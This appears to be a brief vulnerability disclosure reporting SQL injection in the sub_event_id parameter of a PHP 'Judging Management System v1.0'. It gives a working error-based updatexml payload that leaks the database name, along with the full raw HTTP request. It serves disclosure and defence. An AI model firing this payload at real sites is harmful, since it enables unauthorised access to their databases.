# Judging Management System v1.0 by oretnom23 has SQL injection

BUG_Author: Pings

vendors: https://www.sourcecodester.com/php/15910/judging-management-system-using-php-and-mysql-free-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /php-jms/sub_event_details_edit.php?sub_event_id=

Vulnerability location: /php-jms/sub_event_details_edit.php?sub_event_id=, sub_event_id

dbname =jms_db

[+] Payload: /php-jms/sub_event_details_edit.php?sub_event_id=1%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),0)--+ // Leak place ---> sub_event_id


```sql
GET /php-jms/sub_event_details_edit.php?sub_event_id=1%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),0)--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=f6bhcgo222sk31fnm99nf9tjt1
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/206376962-c57fbf60-060f-49f7-976c-a45fe78cd664.png)
